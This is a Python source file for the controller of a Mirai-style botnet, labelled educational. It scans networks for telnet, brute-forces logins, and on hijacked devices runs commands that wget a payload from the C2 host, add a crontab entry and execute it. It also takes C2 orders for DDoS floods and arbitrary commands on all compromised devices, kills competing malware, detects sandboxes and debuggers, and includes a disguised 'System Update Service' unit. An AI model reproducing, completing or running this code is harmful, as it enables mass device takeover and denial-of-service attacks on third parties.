#!/usr/bin/env python3
"""
Main Exploit Controller - Mirai-inspired Botnet System
Educational/Research Purpose Only

This is the main controller that orchestrates the entire attack lifecycle:
1. Network scanning and target discovery
2. Brute force credential attacks
3. Device compromise and fingerprinting
4. Persistence mechanisms
5. C2 communication and coordination
6. DDoS attack participation
7. Evasion and anti-analysis techniques
"""

import sys
import os
import time
import threading
import random
import signal
import subprocess
import json
import hashlib
import socket
import struct
import uuid
import telnetlib
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional
import argparse

# Try to import psutil, but make it optional
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("[!] psutil not available, some evasion features will be limited")

# Import our modules
from scanner import TelnetScanner
from bruteforce import TelnetBruteForcer
from c2_communication import C2Communications
from ddos_manager import DDoSAttack
from session_manager import SessionManager
from device_manager import DeviceManager, DeviceType
from kill_processes import ProcessKiller
from credential_harvester import CredentialHarvester

class ExploitController:
    def __init__(self, c2_host: str = "127.0.0.1", c2_port: int = 8080):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.bot_id = self._generate_bot_id()
        self.session_file = f"/tmp/.{self.bot_id}"
        
        # Core components
        self.scanner = TelnetScanner()
        self.bruteforcer = TelnetBruteForcer()
        self.c2_comm = C2Communications(c2_host, c2_port, self.bot_id)
        self.ddos_manager = DDoSAttack()
        self.session_manager = SessionManager(self.bot_id)
        self.device_manager = DeviceManager()
        self.process_killer = ProcessKiller()
        self.credential_harvester = CredentialHarvester()
        
        # State management
        self.running = True
        self.compromised_devices = []
        self.scan_results = []
        self.current_targets = []
        
        # Load configuration from session manager
        config = self.session_manager.session_data.get('configuration', {})
        self.scan_threads = config.get('scan_threads', 100)
        self.scan_timeout = config.get('scan_timeout', 5)
        self.exploit_delay = tuple(config.get('exploit_delay', [1, 3]))
        self.persistence_enabled = config.get('persistence_enabled', True)
        self.evasion_enabled = config.get('evasion_enabled', True)
        
        # Statistics
        self.stats = {
            'scans_performed': 0,
            'devices_compromised': 0,
            'ddos_attacks': 0,
            'uptime_start': datetime.now(),
            'last_c2_contact': None
        }
        
        # Load existing compromised devices
        self._load_existing_devices()
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)
    
    
    def _generate_bot_id(self) -> str:
        """Generate unique bot ID based on system characteristics"""
        try:
            # Gather system info for unique ID
            hostname = socket.gethostname()
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) 
                           for i in range(0, 8*6, 8)][::-1])
            system_info = f"{hostname}_{mac}_{os.getpid()}"
            return hashlib.md5(system_info.encode()).hexdigest()[:16]
        except:
            return hashlib.md5(str(random.randint(1000000, 9999999)).encode()).hexdigest()[:16]
    
    def _signal_handler(self, signum, frame):
        """Handle shutdown signals gracefully"""
        print(f"\n[!] Received signal {signum}, shutting down...")
        self.running = False
        self._cleanup()
        sys.exit(0)
    
    def _cleanup(self):
        """Clean up resources and remove traces"""
        try:
            # Remove session file
            if os.path.exists(self.session_file):
                os.remove(self.session_file)
            
            # Stop DDoS manager
            if hasattr(self.ddos_manager, 'stop'):
                self.ddos_manager.stop()
            
            print("[*] Cleanup completed")
        except Exception as e:
            pass  # Silent cleanup
    
    def establish_persistence(self):
        """Implement persistence mechanisms (educational demonstration)"""
        if not self.persistence_enabled:
            return
        
        try:
            # Method 1: Cron job (Linux/Unix)
            if os.name == 'posix':
                self._setup_cron_persistence()
            
            # Method 2: Systemd service (Linux)
            self._setup_systemd_persistence()
            
            # Method 3: Hidden file execution
            self._setup_hidden_persistence()
            
            print("[*] Persistence mechanisms established")
        except Exception as e:
            print(f"[!] Persistence setup failed: {e}")
    
    def _setup_cron_persistence(self):
        """Setup cron-based persistence"""
        try:
            current_script = os.path.abspath(__file__)
            cron_entry = f"@reboot python3 {current_script} --silent\n"
            
            # Note: In real scenario, this would modify crontab
            # For educational purposes, we just demonstrate the concept
            print(f"[*] Would add cron entry: {cron_entry.strip()}")
        except Exception as e:
            pass
    
    def _setup_systemd_persistence(self):
        """Setup systemd service persistence"""
        service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 {os.path.abspath(__file__)} --silent
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
"""
        print("[*] Would create systemd service for persistence")
    
    def _setup_hidden_persistence(self):
        """Setup hidden file persistence"""
        try:
            # Create hidden executable copy
            hidden_path = f"/tmp/.{random.randint(1000, 9999)}"
            print(f"[*] Would copy to hidden location: {hidden_path}")
        except Exception as e:
            pass
    
    def implement_evasion(self):
        """Implement evasion and anti-analysis techniques"""
        if not self.evasion_enabled:
            return
        
        try:
            # Check for analysis environment
            if self._detect_analysis_environment():
                print("[!] Analysis environment detected, implementing evasion")
                self._evade_analysis()
            
            # Process name obfuscation
            self._obfuscate_process()
            
            # Network traffic evasion
            self._evade_network_detection()
            
            print("[*] Evasion mechanisms active")
        except Exception as e:
            print(f"[!] Evasion setup failed: {e}")
    
    def _detect_analysis_environment(self) -> bool:
        """Detect if running in analysis/sandbox environment"""
        indicators = [
            # VM detection
            lambda: any(vm in open('/proc/cpuinfo').read().lower() 
                       for vm in ['vmware', 'virtualbox', 'qemu', 'kvm'] 
                       if os.path.exists('/proc/cpuinfo')),
              # Debugger detection
            lambda: os.path.exists('/proc/self/status') and 
                    'TracerPid:\t0' not in open('/proc/self/status').read(),
            
            # Low resource detection (sandbox) - requires psutil
            lambda: PSUTIL_AVAILABLE and psutil.virtual_memory().total < 2 * 1024**3,  # < 2GB RAM
            
            # Analysis tools detection - requires psutil
            lambda: PSUTIL_AVAILABLE and any(proc.name().lower() in ['wireshark', 'tcpdump', 'strace', 'gdb']
                       for proc in psutil.process_iter(['name'])),
        ]
        
        try:
            return any(check() for check in indicators)
        except:
            return False
    
    def _evade_analysis(self):
        """Implement analysis evasion techniques"""
        # Sleep for random time to evade automated analysis
        sleep_time = random.randint(60, 300)
        print(f"[*] Sleeping for {sleep_time} seconds to evade analysis")
        time.sleep(sleep_time)
        
        # Check if environment changed
        if self._detect_analysis_environment():
            print("[!] Still in analysis environment, exiting")
            sys.exit(0)
    
    def _obfuscate_process(self):
        """Obfuscate process name and behavior"""
        try:
            # Change process title (Linux)
            if hasattr(os, 'setpgrp'):
                os.setpgrp()
            
            print("[*] Process obfuscation applied")
        except:
            pass
    
    def _evade_network_detection(self):
        """Implement network evasion techniques"""
        # Randomize user agents, timing, etc.
        self.scanner.randomize_timing = True
        self.bruteforcer.randomize_timing = True
        print("[*] Network evasion enabled")
    
    def fingerprint_device(self, host: str, port: int = 23) -> Dict:
        """Gather device information for fingerprinting"""
        fingerprint = {
            'host': host,
            'port': port,
            'timestamp': datetime.now().isoformat(),
            'services': [],
            'device_type': 'unknown',
            'os_guess': 'unknown',
            'credentials': None        }
        
        try:
            # Basic service detection - simplified for available methods
            # fingerprint['services'] = self.scanner.detect_services(host, [port])
            
            # Telnet banner grabbing
            banner = self._grab_telnet_banner(host, port)
            if banner:
                fingerprint['banner'] = banner
                fingerprint['device_type'] = self._identify_device_type(banner)
                fingerprint['os_guess'] = self._guess_os(banner)
            
            # Additional port scanning for device profiling
            common_iot_ports = [21, 22, 23, 53, 80, 443, 554, 7547, 8080, 8081]
            # Use port range scan instead
            port_results = self.scanner.scan_port_range(host, (min(common_iot_ports), max(common_iot_ports)))
            open_ports = [r['port'] for r in port_results if r['status'] == 'open']
            fingerprint['open_ports'] = open_ports
            
            print(f"[*] Fingerprinted device {host}: {fingerprint['device_type']}")
            
        except Exception as e:
            print(f"[!] Fingerprinting failed for {host}: {e}")
        
        return fingerprint
    
    def _grab_telnet_banner(self, host: str, port: int, timeout: int = 5) -> str:
        """Grab telnet banner for device identification"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            
            # Read banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner.strip()
        except:
            return ""
    
    def _identify_device_type(self, banner: str) -> str:
        """Identify device type based on banner"""
        banner_lower = banner.lower()
        
        device_signatures = {
            'router': ['router', 'gateway', 'wireless', 'broadband'],
            'camera': ['camera', 'ipcam', 'dvr', 'nvr', 'surveillance'],
            'printer': ['printer', 'print server', 'hp ', 'canon', 'epson'],
            'nas': ['nas', 'storage', 'synology', 'qnap'],
            'iot': ['iot', 'smart', 'connected'],
            'embedded': ['embedded', 'busybox', 'buildroot']
        }
        
        for device_type, signatures in device_signatures.items():
            if any(sig in banner_lower for sig in signatures):
                return device_type
        
        return 'unknown'
    
    def _guess_os(self, banner: str) -> str:
        """Guess operating system from banner"""
        banner_lower = banner.lower()
        
        os_signatures = {
            'linux': ['linux', 'busybox', 'buildroot'],
            'vxworks': ['vxworks', 'wind river'],
            'freebsd': ['freebsd'],
            'windows': ['windows', 'microsoft'],
            'embedded': ['embedded', 'real-time']        }
        
        for os_name, signatures in os_signatures.items():
            if any(sig in banner_lower for sig in signatures):
                return os_name
        
        return 'unknown'
    
    def mass_exploitation(self, target_ranges: List[str]):
        """Perform mass exploitation across target ranges"""
        print(f"[*] Starting mass exploitation on {len(target_ranges)} ranges")
        
        for target_range in target_ranges:
            try:
                print(f"[*] Scanning range: {target_range}")
                
                # Scan for targets using the correct method
                targets = self.scanner.scan_ip_range(target_range, 23)
                # Convert to expected format
                formatted_targets = [{'host': t['ip']} for t in targets if t['status'] == 'open']
                self.scan_results.extend(formatted_targets)
                self.stats['scans_performed'] += len(formatted_targets)
                
                # Exploit found targets
                for target in formatted_targets:
                    if not self.running:
                        break
                    
                    host = target['host']
                    print(f"[*] Attempting exploitation of {host}")
                    
                    # Fingerprint device
                    fingerprint = self.fingerprint_device(host)
                    
                    # Attempt brute force
                    success, credentials = self.bruteforcer.attack(host, 23)
                    
                    if success:
                        print(f"[+] Successfully compromised {host} with {credentials}")
                        
                        # Add to compromised devices
                        device_info = {
                            'host': host,
                            'credentials': credentials,
                            'fingerprint': fingerprint,
                            'compromise_time': datetime.now().isoformat(),
                            'status': 'active'
                        }
                        self.compromised_devices.append(device_info)
                        self.stats['devices_compromised'] += 1
                        
                        # Report to C2
                        self.c2_comm.report_compromise(device_info)
                        
                        # Install persistence on device (if applicable)
                        self._install_device_persistence(host, credentials)
                    
                    # Random delay between exploits
                    delay = random.uniform(*self.exploit_delay)
                    time.sleep(delay)
                
            except Exception as e:
                print(f"[!] Error in mass exploitation: {e}")
                continue
    
    def _install_device_persistence(self, host: str, credentials: Tuple[str, str]):
        """Install persistence mechanisms on compromised device"""
        try:
            username, password = credentials
            
            # Connect to device
            import telnetlib
            tn = telnetlib.Telnet(host, 23, timeout=10)
            
            # Login
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode() + b"\n")
            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode() + b"\n")
            
            # Execute persistence commands
            persistence_commands = [
                "cd /tmp",
                f"wget http://{self.c2_host}/payload.sh -O .update",
                "chmod +x .update",
                "echo '*/5 * * * * /tmp/.update' | crontab -",
                "./.update &"
            ]
            
            for cmd in persistence_commands:
                tn.write(cmd.encode() + b"\n")
                time.sleep(1)
            
            tn.close()
            print(f"[+] Persistence installed on {host}")
            
        except Exception as e:
            print(f"[!] Failed to install persistence on {host}: {e}")
    
    def c2_communication_loop(self):
        """Main C2 communication loop"""
        while self.running:
            try:
                # Check for commands from C2
                commands = self.c2_comm.get_commands()
                
                for command in commands:
                    self._execute_c2_command(command)
                
                # Send heartbeat
                status = {
                    'bot_id': self.bot_id,
                    'status': 'active',
                    'compromised_count': len(self.compromised_devices),
                    'stats': self.stats,
                    'timestamp': datetime.now().isoformat()
                }
                self.c2_comm.send_heartbeat(status)
                self.stats['last_c2_contact'] = datetime.now()
                
                # Wait before next check
                time.sleep(30)
                
            except Exception as e:
                print(f"[!] C2 communication error: {e}")
                time.sleep(60)  # Wait longer on error
    
    def _execute_c2_command(self, command: Dict):
        """Execute command received from C2 server"""
        try:
            cmd_type = command.get('type')
            cmd_data = command.get('data', {})
            
            if cmd_type == 'scan':
                targets = cmd_data.get('targets', [])
                self.mass_exploitation(targets)
                
            elif cmd_type == 'ddos':
                target = cmd_data.get('target')
                duration = cmd_data.get('duration', 60)
                attack_type = cmd_data.get('attack_type', 'syn')
                port = cmd_data.get('port', 80)
                threads = cmd_data.get('threads', 5)
                
                # Parse target in case it's in format "ip:port"
                if isinstance(target, str) and ':' in target:
                    target_parts = target.split(':')
                    target = target_parts[0]
                    try:
                        port = int(target_parts[1])
                    except:
                        pass
                
                print(f"[*] Starting DDoS attack on {target}:{port} ({attack_type})")
                
                # Use Python implementation for better cross-platform compatibility
                if attack_type == 'syn' and cmd_data.get('use_python', True):
                    attack_type = 'syn_python'
                
                self.ddos_manager.start_attack(target, port, attack_type, duration, threads)
                self.stats['ddos_attacks'] += 1
                
            elif cmd_type == 'update':
                # Update bot capabilities
                self._update_bot(cmd_data)
                
            elif cmd_type == 'execute':                # Execute command on compromised devices
                command_str = cmd_data.get('command')
                self._execute_on_devices(command_str)
                
            elif cmd_type == 'kill_processes':
                # Kill competing processes
                print("[*] Received kill_processes command from C2")
                killed = self.kill_competing_processes()
                self.c2_comm.send_status_update({'killed_processes': killed})
                
            elif cmd_type == 'stop':
                print("[*] Received stop command from C2")
                self.running = False
                
            print(f"[*] Executed C2 command: {cmd_type}")
            
        except Exception as e:
            print(f"[!] Failed to execute C2 command: {e}")
    
    def _update_bot(self, update_data: Dict):
        """Update bot with new capabilities or configuration"""
        try:
            if 'config' in update_data:
                # Update configuration
                config = update_data['config']
                self.scan_threads = config.get('scan_threads', self.scan_threads)
                self.exploit_delay = tuple(config.get('exploit_delay', self.exploit_delay))
                
            if 'payload_url' in update_data:
                # Download and execute new payload
                payload_url = update_data['payload_url']
                print(f"[*] Downloading update from {payload_url}")
                # Implementation would download and execute
                
            print("[*] Bot updated successfully")
            
        except Exception as e:
            print(f"[!] Bot update failed: {e}")
    
    def _execute_on_devices(self, command: str):
        """Execute command on all compromised devices"""
        print(f"[*] Executing command on {len(self.compromised_devices)} devices")
        
        for device in self.compromised_devices:
            try:
                host = device['host']
                username, password = device['credentials']
                
                # Execute command via telnet
                import telnetlib
                tn = telnetlib.Telnet(host, 23, timeout=10)
                
                # Login
                tn.read_until(b"login: ", timeout=5)
                tn.write(username.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=5)
                tn.write(password.encode() + b"\n")
                
                # Execute command
                tn.write(command.encode() + b"\n")
                result = tn.read_until(b"# ", timeout=10)
                tn.close()
                
                print(f"[+] Command executed on {host}")
                
            except Exception as e:
                print(f"[!] Failed to execute on {host}: {e}")
                device['status'] = 'unreachable'
    
    def interactive_mode(self):
        """Interactive command interface for manual control"""
        print("\n=== Interactive Attack Bot Controller ===")
        print("Type 'help' for available commands")
        
        while self.running:
            try:
                cmd = input("\nattackbot> ").strip().lower()
                
                if cmd == 'help':
                    self._show_help()
                elif cmd == 'status':
                    self._show_status()
                elif cmd.startswith('scan '):
                    target = cmd[5:]
                    self.mass_exploitation([target])
                elif cmd == 'devices':
                    self._show_devices()
                elif cmd.startswith('ddos '):
                    parts = cmd.split()
                    if len(parts) >= 2:
                        target = parts[1]
                        self.ddos_manager.start_attack(target, 'syn', 60)
                elif cmd == 'stats':
                    self._show_stats()
                elif cmd in ['quit', 'exit']:
                    break
                else:
                    print("Unknown command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"Error: {e}")
    
    def _show_help(self):
        """Show available commands"""
        help_text = """
Available Commands:
  help                 - Show this help
  status              - Show bot status
  scan <target>       - Scan and exploit target range
  devices             - Show compromised devices
  ddos <target>       - Start DDoS attack on target
  stats               - Show statistics
  quit/exit           - Exit interactive mode
        """
        print(help_text)
    
    def _show_status(self):
        """Show current bot status"""
        uptime = datetime.now() - self.stats['uptime_start']
        print(f"\nBot Status:")
        print(f"  Bot ID: {self.bot_id}")
        print(f"  Uptime: {uptime}")
        print(f"  C2 Server: {self.c2_host}:{self.c2_port}")
        print(f"  Last C2 Contact: {self.stats['last_c2_contact']}")
        print(f"  Running: {self.running}")
    
    def _show_devices(self):
        """Show compromised devices"""
        print(f"\nCompromised Devices ({len(self.compromised_devices)}):")
        for i, device in enumerate(self.compromised_devices, 1):
            print(f"  {i}. {device['host']} - {device['credentials']} ({device['status']})")
    
    def _show_stats(self):
        """Show attack statistics"""
        print(f"\nAttack Statistics:")
        print(f"  Scans Performed: {self.stats['scans_performed']}")
        print(f"  Devices Compromised: {self.stats['devices_compromised']}")
        print(f"  DDoS Attacks: {self.stats['ddos_attacks']}")
        print(f"  Success Rate: {self.stats['devices_compromised']/max(1, self.stats['scans_performed'])*100:.1f}%")
    
    def run(self, mode: str = 'auto'):
        """Main execution method"""
        print(f"[*] Starting Attack Bot Controller (ID: {self.bot_id})")
        print(f"[*] C2 Server: {self.c2_host}:{self.c2_port}")
        
        # Kill competing processes (Mirai-like behavior)
        self.kill_competing_processes()
        
        # Setup persistence and evasion
        self.establish_persistence()
        self.implement_evasion()
        
        # Start C2 communication thread
        c2_thread = threading.Thread(target=self.c2_communication_loop, daemon=True)
        c2_thread.start()
        
        if mode == 'interactive':
            self.interactive_mode()
        elif mode == 'auto':
            # Automatic mode - scan common ranges
            default_ranges = [
                "192.168.1.0/24",
                "192.168.0.0/24",
                "10.0.0.0/24",
                "172.16.0.0/24"
            ]
            self.mass_exploitation(default_ranges)
            
            # Keep running for C2 commands
            while self.running:
                time.sleep(60)
        
        self._cleanup()

    def _load_existing_devices(self):
        """Load previously compromised devices from session"""
        try:
            existing_devices = self.session_manager.session_data.get('compromised_devices', [])
            self.compromised_devices = existing_devices
            print(f"[*] Loaded {len(existing_devices)} existing compromised devices")
        except Exception as e:
            print(f"[!] Failed to load existing devices: {e}")
            self.compromised_devices = []

    def kill_competing_processes(self):
        """Kill competing malware processes - Mirai-inspired behavior"""
        try:
            print("[*] Scanning for competing processes...")
            killed_count = self.process_killer.kill_competing_processes()
            print(f"[*] Killed {killed_count} competing processes")
            
            # Clean up malware files
            if os.name == 'posix':
                print("[*] Cleaning up competing malware files...")
                if self.process_killer.clean_system():
                    print("[+] System cleanup completed")
                else:
                    print("[!] System cleanup failed")
            
            return killed_count
        except Exception as e:
            print(f"[!] Error killing competing processes: {e}")
            return 0

def main():
    parser = argparse.ArgumentParser(description='Attack Bot Controller - Educational/Research Use Only')
    parser.add_argument('--c2-host', default='127.0.0.1', help='C2 server host')
    parser.add_argument('--c2-port', type=int, default=8080, help='C2 server port')
    parser.add_argument('--mode', choices=['auto', 'interactive'], default='auto', help='Execution mode')
    parser.add_argument('--silent', action='store_true', help='Run in silent mode')
    parser.add_argument('--no-persistence', action='store_true', help='Disable persistence mechanisms')
    parser.add_argument('--no-evasion', action='store_true', help='Disable evasion techniques')
    
    args = parser.parse_args()
    
    # Suppress output in silent mode
    if args.silent:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    
    try:
        controller = ExploitController(args.c2_host, args.c2_port)
        
        # Configure based on arguments
        controller.persistence_enabled = not args.no_persistence
        controller.evasion_enabled = not args.no_evasion
        
        # Run the controller
        controller.run(args.mode)
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
